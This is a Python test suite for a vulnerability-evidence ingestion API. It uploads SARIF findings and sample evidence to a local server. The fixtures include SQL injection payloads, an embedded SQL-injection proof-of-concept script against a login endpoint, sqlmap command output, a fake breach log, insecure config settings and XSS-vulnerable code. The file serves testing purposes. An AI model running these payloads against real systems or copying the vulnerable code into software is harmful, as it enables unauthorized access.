#!/usr/bin/env python3
"""
Comprehensive VXDF Evidence Ingestion Test Suite

This tests all aspects of the evidence ingestion system using real database data.
"""

import json
import tempfile
import requests
import base64
import time
from pathlib import Path
from typing import Dict, Any, List


class ComprehensiveEvidenceTest:
    """Comprehensive test suite for evidence ingestion with real data."""
    
    def __init__(self, base_url: str = "http://localhost:5001/api"):
        self.base_url = base_url
        self.session = requests.Session()
        self.real_finding_ids = []
        
    def setup(self):
        """Setup test environment and get real finding IDs."""
        print("🔧 Setting up test environment...")
        
        # Get real finding IDs from database
        try:
            response = self.session.get(f"{self.base_url}/findings")
            if response.status_code == 200:
                findings = response.json().get('findings', [])
                self.real_finding_ids = [f['id'] for f in findings[:3]]
                print(f"✅ Found {len(self.real_finding_ids)} existing findings")
                return True
            else:
                print(f"❌ Failed to get findings: {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ Setup failed: {e}")
            return False
    
    def test_external_evidence_with_real_sarif(self):
        """Test external evidence with a properly structured SARIF that creates findings."""
        print("\n=== Testing External Evidence with Real SARIF ===")
        
        # Create a proper SARIF file that will generate findings
        sarif_content = {
            "version": "2.1.0",
            "runs": [
                {
                    "tool": {
                        "driver": {
                            "name": "TestSecurityScanner",
                            "version": "1.0.0",
                            "rules": [
                                {
                                    "id": "SQL_INJECTION_001", 
                                    "shortDescription": {"text": "SQL Injection"},
                                    "fullDescription": {"text": "SQL injection vulnerability detected"}
                                },
                                {
                                    "id": "XSS_STORED_001",
                                    "shortDescription": {"text": "Stored XSS"},
                                    "fullDescription": {"text": "Stored cross-site scripting vulnerability"}
                                }
                            ]
                        }
                    },
                    "results": [
                        {
                            "ruleId": "SQL_INJECTION_001",
                            "ruleIndex": 0,
                            "level": "error",
                            "message": {"text": "SQL injection vulnerability in login endpoint"},
                            "locations": [
                                {
                                    "physicalLocation": {
                                        "artifactLocation": {"uri": "src/auth/login.py"},
                                        "region": {"startLine": 42, "endLine": 45}
                                    }
                                }
                            ],
                            "properties": {
                                "cwe": "89",
                                "severity": "HIGH"
                            }
                        },
                        {
                            "ruleId": "XSS_STORED_001", 
                            "ruleIndex": 1,
                            "level": "warning",
                            "message": {"text": "Stored XSS in user profile display"},
                            "locations": [
                                {
                                    "physicalLocation": {
                                        "artifactLocation": {"uri": "src/profile/display.py"},
                                        "region": {"startLine": 23, "endLine": 25}
                                    }
                                }
                            ],
                            "properties": {
                                "cwe": "79",
                                "severity": "MEDIUM"
                            }
                        }
                    ]
                }
            ]
        }
        
        # External evidence with multiple matching strategies
        external_evidence = [
            {
                "findingMatcher": {"cwe_match": 89},
                "evidenceType": "HTTP_REQUEST_LOG",
                "description": "HTTP request demonstrating SQL injection",
                "data": {
                    "method": "POST",
                    "url": "/api/auth/login",
                    "headers": [
                        {"name": "Content-Type", "value": "application/json"},
                        {"name": "User-Agent", "value": "TestBot/1.0"}
                    ],
                    "body": "{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}",
                    "bodyEncoding": "plaintext"
                }
            },
            {
                "findingMatcher": {"cwe_match": 89},
                "evidenceType": "HTTP_RESPONSE_LOG",
                "description": "Server response confirming SQL injection success",
                "data": {
                    "statusCode": 200,
                    "url": "/api/auth/login",
                    "headers": [
                        {"name": "Content-Type", "value": "application/json"},
                        {"name": "Set-Cookie", "value": "session=admin_token_123"}
                    ],
                    "body": "{\"status\": \"success\", \"message\": \"Login successful\", \"role\": \"admin\"}",
                    "bodyEncoding": "plaintext"
                }
            },
            {
                "findingMatcher": {"rule_id_match": "XSS_STORED_001"},
                "evidenceType": "CODE_SNIPPET_SOURCE",
                "description": "Vulnerable code showing unsanitized output",
                "data": {
                    "content": "def render_profile(user_data):\n    # VULNERABLE: Direct interpolation without escaping\n    return f\"<h1>Welcome {user_data['name']}</h1>\"",
                    "language": "python",
                    "filePath": "src/profile/display.py",
                    "startLine": 23,
                    "endLine": 25
                }
            },
            {
                "findingMatcher": {"apply_to_all": True},
                "evidenceType": "MANUAL_VERIFICATION_NOTES",
                "description": "Comprehensive manual testing results",
                "data": {
                    "verificationSteps": "1. Set up isolated test environment\n2. Deploy vulnerable application version\n3. Execute SQL injection payloads\n4. Test XSS payload persistence\n5. Document exploitation results",
                    "observedOutcome": "Both vulnerabilities successfully exploited. SQL injection grants admin access, XSS payload executes in victim browsers.",
                    "testerName": "Security Engineer",
                    "toolsUsed": ["Burp Suite Professional", "SQLMap", "Browser DevTools"]
                }
            }
        ]
        
        return self._test_upload_with_evidence(sarif_content, external_evidence, "Comprehensive SARIF Test")
    
    def _test_upload_with_evidence(self, sarif_content, external_evidence, test_name):
        """Helper method to test upload with evidence."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sarif', delete=False) as f:
            json.dump(sarif_content, f, indent=2)
            sarif_file_path = f.name
        
        try:
            files = {
                'file': ('test_scan.sarif', open(sarif_file_path, 'rb'), 'application/json')
            }
            
            form_data = {
                'parser_type': 'sarif',
                'target_name': test_name,
                'target_version': '1.0.0',
                'validate': 'true',
                'external_evidence_json': json.dumps(external_evidence)
            }
            
            response = self.session.post(f"{self.base_url}/upload", files=files, data=form_data)
            
            print(f"Status Code: {response.status_code}")
            if response.status_code == 200:
                result = response.json()
                evidence_count = result.get('evidenceProcessed', 0)
                print(f"✅ Successfully processed {evidence_count} external evidence items")
                print(f"📄 Generated VXDF: {result.get('vxdf_file')}")
                return True
            else:
                print(f"❌ Upload failed: {response.json()}")
                return False
                
        finally:
            Path(sarif_file_path).unlink()
            if 'file' in files:
                files['file'][1].close()
    
    def test_individual_file_uploads(self):
        """Test individual evidence file uploads with real finding IDs."""
        print("\n=== Testing Individual Evidence File Uploads ===")
        
        if not self.real_finding_ids:
            print("❌ No real finding IDs available")
            return False
        
        finding_id = self.real_finding_ids[0]
        print(f"Using finding ID: {finding_id}")
        
        success_count = 0
        total_tests = 5
        
        # Test 1: Screenshot upload
        if self._test_screenshot_upload_real(finding_id):
            success_count += 1
            
        # Test 2: PoC script upload  
        if self._test_poc_script_upload_real(finding_id):
            success_count += 1
            
        # Test 3: Log file upload
        if self._test_log_file_upload_real(finding_id):
            success_count += 1
            
        # Test 4: Command output upload
        if self._test_command_output_upload_real(finding_id):
            success_count += 1
            
        # Test 5: Configuration file upload
        if self._test_config_file_upload_real(finding_id):
            success_count += 1
        
        print(f"✅ Individual file upload tests: {success_count}/{total_tests} passed")
        return success_count == total_tests
    
    def _test_screenshot_upload_real(self, finding_id):
        """Test screenshot upload with real finding ID."""
        print("\n--- Testing Screenshot Upload ---")
        
        # Create a more realistic test image (red square PNG)
        png_data = base64.b64decode(
            "iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAABUlEQVR42mNk+M9QDwAGhAJ+lmlX3gAAAABJRU5ErkJggg=="
        )
        
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:
            f.write(png_data)
            png_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('vuln_screenshot.png', open(png_file_path, 'rb'), 'image/png')
            }
            
            form_data = {
                'evidence_type_str': 'SCREENSHOT_EMBEDDED_BASE64',
                'description': 'Screenshot showing vulnerability exploitation in browser',
                'caption': 'Browser showing successful SQL injection with admin panel access'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{finding_id}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            if response.status_code == 200:
                result = response.json()
                print(f"✅ Screenshot: {result['message']}")
                return True
            else:
                print(f"❌ Screenshot failed: {response.json()}")
                return False
                
        finally:
            Path(png_file_path).unlink()
    
    def _test_poc_script_upload_real(self, finding_id):
        """Test PoC script upload."""
        print("\n--- Testing PoC Script Upload ---")
        
        poc_script = '''#!/usr/bin/env python3
"""
Advanced SQL Injection PoC Script
Demonstrates authentication bypass via SQL injection
"""

import requests
import sys
import json

def test_sql_injection(target_url):
    """Test SQL injection vulnerability in login endpoint."""
    
    # Test payloads
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT 1,2,3 --"
    ]
    
    print("Testing SQL injection payloads...")
    
    for payload in payloads:
        data = {
            "username": payload,
            "password": "anything"
        }
        
        try:
            response = requests.post(
                f"{target_url}/api/auth/login",
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get("status") == "success":
                    print(f"✅ VULNERABLE: Payload '{payload}' successful!")
                    print(f"Response: {json.dumps(result, indent=2)}")
                    return True
                    
        except Exception as e:
            print(f"Error with payload '{payload}': {e}")
    
    print("❌ No successful exploitation")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 sql_injection_poc.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    success = test_sql_injection(target_url)
    sys.exit(0 if success else 1)
'''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(poc_script)
            script_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('sql_injection_poc.py', open(script_file_path, 'rb'), 'text/plain')
            }
            
            form_data = {
                'evidence_type_str': 'POC_SCRIPT',
                'description': 'Advanced SQL injection proof-of-concept script',
                'script_language': 'python',
                'expected_outcome': 'Authentication bypass and admin access granted'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{finding_id}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            if response.status_code == 200:
                result = response.json()
                print(f"✅ PoC Script: {result['message']}")
                return True
            else:
                print(f"❌ PoC Script failed: {response.json()}")
                return False
                
        finally:
            Path(script_file_path).unlink()
    
    def _test_log_file_upload_real(self, finding_id):
        """Test log file upload."""
        print("\n--- Testing Log File Upload ---")
        
        log_content = """2025-05-31 12:15:42,123 INFO [auth.login] User login attempt: admin
2025-05-31 12:15:42,124 DEBUG [auth.login] SQL Query: SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
2025-05-31 12:15:42,125 WARNING [auth.login] Suspicious SQL injection pattern detected in login
2025-05-31 12:15:42,126 ERROR [auth.login] Authentication bypass detected - granting admin access
2025-05-31 12:15:42,127 INFO [auth.login] User 'admin' successfully authenticated with admin privileges
2025-05-31 12:15:42,128 DEBUG [session] Creating admin session token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
2025-05-31 12:15:42,129 INFO [access] Admin panel access granted to user 'admin'
2025-05-31 12:15:42,130 WARNING [security] Multiple privilege escalation attempts detected from IP 192.168.1.100
2025-05-31 12:15:42,131 CRITICAL [security] SECURITY BREACH: Unauthorized admin access via SQL injection
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.log', delete=False) as f:
            f.write(log_content)
            log_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('application.log', open(log_file_path, 'rb'), 'text/plain')
            }
            
            form_data = {
                'evidence_type_str': 'RUNTIME_APPLICATION_LOG_ENTRY',
                'description': 'Application logs showing SQL injection exploitation',
                'log_source': 'authentication_service',
                'log_level': 'INFO'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{finding_id}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            if response.status_code == 200:
                result = response.json()
                print(f"✅ Log File: {result['message']}")
                return True
            else:
                print(f"❌ Log File failed: {response.json()}")
                return False
                
        finally:
            Path(log_file_path).unlink()
    
    def _test_command_output_upload_real(self, finding_id):
        """Test command output upload."""
        print("\n--- Testing Command Output Upload ---")
        
        command_output = """$ sqlmap -u "http://target.com/login" --data="username=admin&password=test" --level=5 --risk=3

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.12#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:15:30] [INFO] testing connection to the target URL
[12:15:31] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:15:32] [INFO] testing if the target URL content is stable
[12:15:33] [INFO] target URL content is stable
[12:15:34] [INFO] testing if POST parameter 'username' is dynamic
[12:15:35] [INFO] POST parameter 'username' appears to be dynamic
[12:15:36] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable
[12:15:37] [INFO] testing for SQL injection on POST parameter 'username'
[12:15:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:15:39] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[12:15:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[12:15:41] [INFO] POST parameter 'username' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable
[12:15:42] [INFO] POST parameter 'username' is vulnerable to SQL injection
[12:15:43] [INFO] the back-end DBMS is MySQL
[12:15:44] [INFO] fingerprinting the back-end DBMS
[12:15:45] [INFO] the back-end DBMS is MySQL >= 5.5

back-end DBMS: MySQL >= 5.5
[12:15:46] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] mysql
[*] webapp_db

[12:15:47] [INFO] VULNERABILITY CONFIRMED: SQL injection in username parameter
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write(command_output)
            output_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('sqlmap_output.txt', open(output_file_path, 'rb'), 'text/plain')
            }
            
            form_data = {
                'evidence_type_str': 'COMMAND_EXECUTION_OUTPUT',
                'description': 'SQLMap automated testing results confirming SQL injection',
                'command': 'sqlmap -u "http://target.com/login" --data="username=admin&password=test" --level=5 --risk=3',
                'exit_code': 0,
                'tool_name': 'SQLMap',
                'tool_version': '1.6.12'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{finding_id}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            if response.status_code == 200:
                result = response.json()
                print(f"✅ Command Output: {result['message']}")
                return True
            else:
                print(f"❌ Command Output failed: {response.json()}")
                return False
                
        finally:
            Path(output_file_path).unlink()
    
    def _test_config_file_upload_real(self, finding_id):
        """Test configuration file upload."""
        print("\n--- Testing Configuration File Upload ---")
        
        config_content = """# Web Application Security Configuration
# WARNING: This configuration contains security vulnerabilities

# Database Configuration - VULNERABLE: Hardcoded credentials
DB_HOST=localhost
DB_PORT=3306
DB_NAME=webapp_db
DB_USER=root
DB_PASSWORD=admin123
DB_DEBUG=true  # VULNERABLE: Debug mode enabled in production

# Authentication Settings - VULNERABLE: Weak settings
AUTH_SECRET_KEY=secret123  # VULNERABLE: Weak secret key
AUTH_TOKEN_EXPIRY=99999999  # VULNERABLE: Tokens never expire
AUTH_ENABLE_SQL_INJECTION_PROTECTION=false  # VULNERABLE: SQL injection protection disabled

# Session Configuration - VULNERABLE
SESSION_COOKIE_SECURE=false  # VULNERABLE: Insecure cookies
SESSION_COOKIE_HTTPONLY=false  # VULNERABLE: XSS possible
SESSION_COOKIE_SAMESITE=none  # VULNERABLE: CSRF possible

# Security Headers - VULNERABLE: All disabled
SECURITY_CSP_ENABLED=false
SECURITY_HSTS_ENABLED=false
SECURITY_XSS_PROTECTION=false
SECURITY_CONTENT_TYPE_NOSNIFF=false

# Logging - VULNERABLE: Sensitive data logging
LOG_LEVEL=DEBUG
LOG_SENSITIVE_DATA=true  # VULNERABLE: Passwords logged in plaintext
LOG_SQL_QUERIES=true     # VULNERABLE: SQL queries with data logged

# Development Settings - VULNERABLE: Enabled in production
DEBUG_MODE=true
ENABLE_DEBUG_TOOLBAR=true
DISABLE_CSRF_PROTECTION=true  # VULNERABLE: CSRF protection disabled
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as f:
            f.write(config_content)
            config_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('webapp.conf', open(config_file_path, 'rb'), 'text/plain')
            }
            
            form_data = {
                'evidence_type_str': 'CONFIGURATION_FILE_SNIPPET',
                'description': 'Application configuration file showing multiple security misconfigurations',
                'component_name': 'WebApplication',
                'setting_name': 'security_settings'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{finding_id}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            if response.status_code == 200:
                result = response.json()
                print(f"✅ Config File: {result['message']}")
                return True
            else:
                print(f"❌ Config File failed: {response.json()}")
                return False
                
        finally:
            Path(config_file_path).unlink()
    
    def test_comprehensive_error_handling(self):
        """Test comprehensive error handling scenarios."""
        print("\n=== Testing Comprehensive Error Handling ===")
        
        success_count = 0
        total_error_tests = 6
        
        # Test 1: Invalid finding ID
        print("\n--- Testing Invalid Finding ID ---")
        if self._test_invalid_finding_id():
            success_count += 1
        
        # Test 2: Invalid evidence type
        print("\n--- Testing Invalid Evidence Type ---")
        if self._test_invalid_evidence_type():
            success_count += 1
        
        # Test 3: Missing required fields
        print("\n--- Testing Missing Required Fields ---")
        if self._test_missing_required_fields():
            success_count += 1
        
        # Test 4: Invalid JSON in external evidence
        print("\n--- Testing Invalid External Evidence JSON ---")
        if self._test_invalid_external_evidence_json():
            success_count += 1
        
        # Test 5: Large file upload
        print("\n--- Testing Large File Upload ---")
        if self._test_large_file_upload():
            success_count += 1
        
        # Test 6: Malformed file content
        print("\n--- Testing Malformed File Content ---")
        if self._test_malformed_file_content():
            success_count += 1
        
        print(f"✅ Error handling tests: {success_count}/{total_error_tests} passed")
        return success_count >= 4  # Allow some tolerance for error handling tests
    
    def _test_invalid_finding_id(self):
        """Test upload with invalid finding ID."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("test content")
            test_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('test.txt', open(test_file_path, 'rb'), 'text/plain')
            }
            
            form_data = {
                'evidence_type_str': 'MANUAL_VERIFICATION_NOTES',
                'description': 'Test evidence'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/99999/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            if response.status_code == 404:
                print("✅ Correctly rejected invalid finding ID")
                return True
            else:
                print(f"❌ Unexpected response for invalid finding ID: {response.status_code}")
                return False
                
        finally:
            Path(test_file_path).unlink()
    
    def _test_invalid_evidence_type(self):
        """Test upload with invalid evidence type."""
        if not self.real_finding_ids:
            return False
            
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("test content")
            test_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('test.txt', open(test_file_path, 'rb'), 'text/plain')
            }
            
            form_data = {
                'evidence_type_str': 'INVALID_EVIDENCE_TYPE',
                'description': 'Test evidence'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{self.real_finding_ids[0]}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            if response.status_code == 400:
                print("✅ Correctly rejected invalid evidence type")
                return True
            else:
                print(f"❌ Unexpected response for invalid evidence type: {response.status_code}")
                return False
                
        finally:
            Path(test_file_path).unlink()
    
    def _test_missing_required_fields(self):
        """Test upload with missing required fields."""
        if not self.real_finding_ids:
            return False
            
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("test content")
            test_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('test.txt', open(test_file_path, 'rb'), 'text/plain')
            }
            
            # Missing description field
            form_data = {
                'evidence_type_str': 'MANUAL_VERIFICATION_NOTES'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{self.real_finding_ids[0]}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            if response.status_code == 400:
                print("✅ Correctly rejected missing description")
                return True
            else:
                print(f"❌ Unexpected response for missing description: {response.status_code}")
                return False
                
        finally:
            Path(test_file_path).unlink()
    
    def _test_invalid_external_evidence_json(self):
        """Test upload with invalid external evidence JSON."""
        sarif_content = {"version": "2.1.0", "runs": []}
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sarif', delete=False) as f:
            json.dump(sarif_content, f)
            sarif_file_path = f.name
        
        try:
            files = {
                'file': ('test.sarif', open(sarif_file_path, 'rb'), 'application/json')
            }
            
            form_data = {
                'parser_type': 'sarif',
                'external_evidence_json': 'invalid json'
            }
            
            response = self.session.post(f"{self.base_url}/upload", files=files, data=form_data)
            files['file'][1].close()
            
            if response.status_code == 400:
                print("✅ Correctly rejected invalid JSON")
                return True
            else:
                print(f"❌ Unexpected response for invalid JSON: {response.status_code}")
                return False
                
        finally:
            Path(sarif_file_path).unlink()
    
    def _test_large_file_upload(self):
        """Test upload of large file."""
        if not self.real_finding_ids:
            return False
            
        # Create a 1MB file
        large_content = "A" * (1024 * 1024)
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write(large_content)
            large_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('large_file.txt', open(large_file_path, 'rb'), 'text/plain')
            }
            
            form_data = {
                'evidence_type_str': 'MANUAL_VERIFICATION_NOTES',
                'description': 'Large test file'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{self.real_finding_ids[0]}/attach_evidence_file",
                files=files,
                data=form_data,
                timeout=30
            )
            files['evidence_file'][1].close()
            
            # Accept either success or reasonable rejection
            if response.status_code in [200, 413, 400]:
                print(f"✅ Large file handled appropriately: {response.status_code}")
                return True
            else:
                print(f"❌ Unexpected response for large file: {response.status_code}")
                return False
                
        finally:
            Path(large_file_path).unlink()
    
    def _test_malformed_file_content(self):
        """Test upload of file with malformed content."""
        if not self.real_finding_ids:
            return False
            
        # Create file with binary content but claim it's JSON
        binary_content = b'\x00\x01\x02\x03\x04\x05\xFF\xFE\xFD'
        
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.json', delete=False) as f:
            f.write(binary_content)
            malformed_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('malformed.json', open(malformed_file_path, 'rb'), 'application/json')
            }
            
            form_data = {
                'evidence_type_str': 'MANUAL_VERIFICATION_NOTES',
                'description': 'Malformed file test'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{self.real_finding_ids[0]}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            # Should either succeed (content stored as-is) or fail gracefully
            if response.status_code in [200, 400]:
                print(f"✅ Malformed content handled: {response.status_code}")
                return True
            else:
                print(f"❌ Unexpected response for malformed content: {response.status_code}")
                return False
                
        finally:
            Path(malformed_file_path).unlink()
    
    def test_edge_cases(self):
        """Test edge cases and boundary conditions."""
        print("\n=== Testing Edge Cases ===")
        
        success_count = 0
        total_edge_tests = 3
        
        # Test 1: Empty evidence array
        print("\n--- Testing Empty Evidence Array ---")
        if self._test_empty_evidence_array():
            success_count += 1
        
        # Test 2: Evidence with no matching findings
        print("\n--- Testing No Matching Findings ---")
        if self._test_no_matching_findings():
            success_count += 1
        
        # Test 3: Multiple evidence items for same finding
        print("\n--- Testing Multiple Evidence Items ---")
        if self._test_multiple_evidence_items():
            success_count += 1
        
        print(f"✅ Edge case tests: {success_count}/{total_edge_tests} passed")
        return success_count >= 2
    
    def _test_empty_evidence_array(self):
        """Test upload with empty evidence array."""
        sarif_content = {"version": "2.1.0", "runs": []}
        
        return self._test_upload_with_evidence(sarif_content, [], "Empty Evidence Test")
    
    def _test_no_matching_findings(self):
        """Test evidence that matches no findings."""
        sarif_content = {"version": "2.1.0", "runs": []}
        
        external_evidence = [
            {
                "findingMatcher": {"cwe_match": 999999},  # Non-existent CWE
                "evidenceType": "MANUAL_VERIFICATION_NOTES",
                "description": "Evidence that should match nothing",
                "data": {"notes": "This should not match any findings"}
            }
        ]
        
        return self._test_upload_with_evidence(sarif_content, external_evidence, "No Match Test")
    
    def _test_multiple_evidence_items(self):
        """Test multiple evidence items for the same finding."""
        if not self.real_finding_ids:
            return False
        
        finding_id = self.real_finding_ids[0]
        success_count = 0
        
        # Upload multiple pieces of evidence quickly
        for i in range(3):
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write(f"Evidence item {i+1} content")
                test_file_path = f.name
            
            try:
                files = {
                    'evidence_file': (f'evidence_{i+1}.txt', open(test_file_path, 'rb'), 'text/plain')
                }
                
                form_data = {
                    'evidence_type_str': 'MANUAL_VERIFICATION_NOTES',
                    'description': f'Evidence item {i+1} for testing multiple uploads'
                }
                
                response = self.session.post(
                    f"{self.base_url}/findings/{finding_id}/attach_evidence_file",
                    files=files,
                    data=form_data
                )
                files['evidence_file'][1].close()
                
                if response.status_code == 200:
                    success_count += 1
                    
            finally:
                Path(test_file_path).unlink()
        
        if success_count == 3:
            print("✅ Successfully uploaded multiple evidence items")
            return True
        else:
            print(f"❌ Only {success_count}/3 evidence items uploaded successfully")
            return False
    
    def test_performance(self):
        """Test performance with reasonable load."""
        print("\n=== Testing Performance ===")
        
        if not self.real_finding_ids:
            print("❌ No real finding IDs for performance testing")
            return False
        
        start_time = time.time()
        
        # Test rapid sequential uploads
        success_count = 0
        total_uploads = 5
        
        for i in range(total_uploads):
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write(f"Performance test evidence {i+1}")
                test_file_path = f.name
            
            try:
                files = {
                    'evidence_file': (f'perf_test_{i+1}.txt', open(test_file_path, 'rb'), 'text/plain')
                }
                
                form_data = {
                    'evidence_type_str': 'MANUAL_VERIFICATION_NOTES',
                    'description': f'Performance test evidence {i+1}'
                }
                
                response = self.session.post(
                    f"{self.base_url}/findings/{self.real_finding_ids[0]}/attach_evidence_file",
                    files=files,
                    data=form_data
                )
                files['evidence_file'][1].close()
                
                if response.status_code == 200:
                    success_count += 1
                    
            finally:
                Path(test_file_path).unlink()
        
        end_time = time.time()
        total_time = end_time - start_time
        
        print(f"⏱️  Uploaded {success_count}/{total_uploads} files in {total_time:.2f}s")
        print(f"📊 Average time per upload: {total_time/total_uploads:.2f}s")
        
        # Consider test successful if most uploads worked and average time is reasonable
        if success_count >= 4 and total_time/total_uploads < 5.0:
            print("✅ Performance test passed")
            return True
        else:
            print("❌ Performance test failed")
            return False

    def run_comprehensive_tests(self):
        """Run all comprehensive evidence ingestion tests."""
        print("🚀 COMPREHENSIVE VXDF EVIDENCE INGESTION TESTS")
        print("=" * 60)
        
        # Setup
        if not self.setup():
            print("❌ Setup failed, cannot continue")
            return False
        
        success_count = 0
        total_tests = 5
        
        # Test 1: External evidence with real SARIF
        print(f"\n{1}/{total_tests}: External Evidence with Real SARIF")
        if self.test_external_evidence_with_real_sarif():
            success_count += 1
        
        # Test 2: Individual file uploads
        print(f"\n{2}/{total_tests}: Individual Evidence File Uploads")
        if self.test_individual_file_uploads():
            success_count += 1
        
        # Test 3: Error handling
        print(f"\n{3}/{total_tests}: Error Handling")
        if self.test_comprehensive_error_handling():
            success_count += 1
        
        # Test 4: Edge cases
        print(f"\n{4}/{total_tests}: Edge Cases")
        if self.test_edge_cases():
            success_count += 1
        
        # Test 5: Performance and stress testing
        print(f"\n{5}/{total_tests}: Performance Testing")
        if self.test_performance():
            success_count += 1
        
        # Final results
        print("\n" + "=" * 60)
        print(f"📊 COMPREHENSIVE TEST RESULTS: {success_count}/{total_tests} passed")
        
        if success_count == total_tests:
            print("🎉 ALL COMPREHENSIVE TESTS PASSED!")
            print("\n✅ Evidence ingestion system is working perfectly:")
            print("  • External evidence JSON processing ✅")
            print("  • Individual file uploads ✅") 
            print("  • Error handling ✅")
            print("  • Edge cases ✅")
            print("  • Performance ✅")
            return True
        else:
            print(f"⚠️  {total_tests - success_count} test(s) failed")
            return False


def main():
    """Main function."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Comprehensive VXDF evidence ingestion tests")
    parser.add_argument("--base-url", default="http://localhost:5001/api", help="API base URL")
    args = parser.parse_args()
    
    tester = ComprehensiveEvidenceTest(args.base_url)
    
    try:
        success = tester.run_comprehensive_tests()
        return 0 if success else 1
    except requests.exceptions.ConnectionError:
        print(f"\n❌ Could not connect to API at {args.base_url}")
        print("Make sure the server is running: python3 -m api.server --port 5001")
        return 1
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        return 1


if __name__ == "__main__":
    exit(main()) 